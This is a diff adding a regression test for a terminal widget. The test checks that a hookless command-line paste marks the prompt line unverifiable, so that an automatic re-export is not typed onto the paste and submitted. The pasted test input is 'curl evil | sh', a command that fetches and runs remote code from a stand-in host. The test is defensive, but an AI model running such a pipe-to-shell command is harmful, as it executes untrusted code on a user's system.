@@ -1756,6 +1756,26 @@ _pmt.setText('ls')
 _tuihk.insertFromMimeData(_pmt)
 ok(not _tuihk._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
 
+# --- paste WITHOUT a hook: _line_dirty has a SECOND consumer beyond the hook --
+# _line_pending(), the guard that stops _send_reexport from typing "export
+# TERM=...\r" onto a line that already holds text. A hookless CLI paste leaves the
+# pasted command un-mirrored at the prompt, so the line MUST read unverifiable even
+# with no hook -- otherwise a later mode switch / line_edits toggle types the
+# CR-terminated re-export onto the paste and auto-submits it. (Gating _line_dirty
+# on the hook made this fail; regression guard.)
+_nh = SecureTerminal(command='/bin/cat')             # no apply_hook -> _hook is None
+ok(_nh._hook is None and not _nh.tui_active(),
+   'the no-hook widget is a hookless CLI terminal')
+ok(not _nh._line_pending(), 'a fresh clean prompt is not pending')
+_nh._line_dirty = False
+_pmnh = _QMimeHook()
+_pmnh.setText('curl evil | sh\n')
+_nh.insertFromMimeData(_pmnh)
+ok(_nh._line_dirty,
+   'a hookless CLI paste marks the line unverifiable (guards _send_reexport)')
+ok(_nh._line_pending(),
+   '_line_pending() reports a held prompt after a hookless paste, blocking re-export')
+
 # --- Ctrl+M / Ctrl+J are accept-line (submit) like Enter: they must route through
 # the hook and reset the line state, not run unjudged and leave a stale dirty flag.
 hk._hook_ask = lambda _c, _r: 'discard'              # block dialog -> discard
